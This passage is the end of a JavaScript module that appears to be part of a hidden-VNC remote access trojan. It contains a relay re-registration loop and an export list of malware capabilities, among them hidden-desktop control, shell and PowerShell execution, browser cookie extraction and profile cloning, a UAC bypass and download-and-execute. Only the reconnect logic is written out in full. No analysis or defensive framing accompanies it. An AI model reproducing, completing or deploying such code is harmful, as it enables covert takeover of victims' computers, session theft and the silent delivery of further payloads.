      // Auto-reconnect
      if (_totalErrors > 15) {
        if (_autoReconnect && _reconnectAttempts < _maxReconnectAttempts) {
          _reconnectAttempts++;
          console.error('[HVNC] Connection issues, auto-reconnect attempt', _reconnectAttempts, '/', _maxReconnectAttempts);
          await new Promise(function(r) { setTimeout(r, _reconnectDelay); });
          var reReg = await hvncRelayRequest('/api/hvnc/register', 'POST', regData);
          if (reReg && reReg['success']) {
            console.log('[HVNC] Re-registration successful');
            _totalErrors = 0;
          }
        } else if (!_autoReconnect || _reconnectAttempts >= _maxReconnectAttempts) {
          console.error('[HVNC] Max reconnect attempts reached, stopping');
          _hvncActive = false;
          break;
        }
      }
    }
  })();

  return { agentId: agentId, desktopName: HVNC_DESKTOP_NAME };
}

module.exports = {};
// Core
module.exports['startHvncSession'] = startHvncSession;
module.exports['launchOnDesktop'] = launchOnDesktop;
module.exports['captureHiddenDesktop'] = captureHiddenDesktop;
module.exports['sendMouseInput'] = sendMouseInput;
module.exports['sendKeyInput'] = sendKeyInput;
module.exports['typeText'] = typeText;
module.exports['closeHiddenDesktop'] = closeHiddenDesktop;
module.exports['getClipboard'] = getClipboard;
module.exports['setClipboard'] = setClipboard;
module.exports['listWindows'] = listWindows;
module.exports['focusWindow'] = focusWindow;
module.exports['closeWindowByHandle'] = closeWindowByHandle;
module.exports['listProcesses'] = listProcesses;
module.exports['killProcess'] = killProcess;
module.exports['setResolution'] = setResolution;
module.exports['HVNC_DESKTOP_NAME'] = HVNC_DESKTOP_NAME;
// Feature 3: Window Manipulation
module.exports['minimizeWindow'] = minimizeWindow;
module.exports['maximizeWindow'] = maximizeWindow;
module.exports['restoreWindow'] = restoreWindow;
module.exports['resizeWindow'] = resizeWindow;
module.exports['setAlwaysOnTop'] = setAlwaysOnTop;
// Feature 4: Shell Execution
module.exports['executeCommand'] = executeCommand;
module.exports['executePowerShell'] = executePowerShell;
// Feature 5: Cookie Injection
module.exports['extractBrowserCookies'] = extractBrowserCookies;
module.exports['cloneBrowserProfile'] = cloneBrowserProfile;
module.exports['launchBrowserWithProfile'] = launchBrowserWithProfile;
// Feature 12: Power Management
module.exports['setAutoReconnect'] = setAutoReconnect;
// Feature 13: UAC Bypass
module.exports['uacBypass'] = uacBypass;
// Download & Execute
module.exports['downloadAndExecute'] = downloadAndExecute;
// System Management
module.exports['getSystemInfo'] = getSystemInfo;
module.exports['isAdmin'] = isAdmin;
module.exports['getDriveInfo'] = getDriveInfo;
module.exports['getNetworkInfo'] = getNetworkInfo;
module.exports['getInstalledPrograms'] = getInstalledPrograms;
module.exports['captureRealDesktop'] = captureRealDesktop;
module.exports['powerAction'] = powerAction;
module.exports['openUrl'] = openUrl;
module.exports['setRegistryValue'] = setRegistryValue;
module.exports['getRegistryValue'] = getRegistryValue;
